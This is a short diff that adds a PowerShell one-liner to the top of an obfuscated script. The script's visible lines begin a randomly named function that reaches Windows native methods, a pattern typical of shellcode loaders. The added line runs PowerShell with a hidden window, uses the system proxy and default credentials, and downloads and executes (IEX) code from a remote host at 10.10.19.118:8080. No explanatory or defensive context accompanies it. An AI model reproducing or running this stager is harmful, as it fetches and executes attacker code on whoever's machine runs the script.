@@ -1,3 +1,4 @@
+powershell.exe -nop -w hidden -c $O=new-object net.webclient;$O.proxy=[Net.WebRequest]::GetSystemWebProxy();$O.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $O.downloadstring('http://10.10.19.118:8080/2aPNAwXBa');
 function vr0n4 {
 	Param ($tqWKX, $nNqU)		
 	$s0xy = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
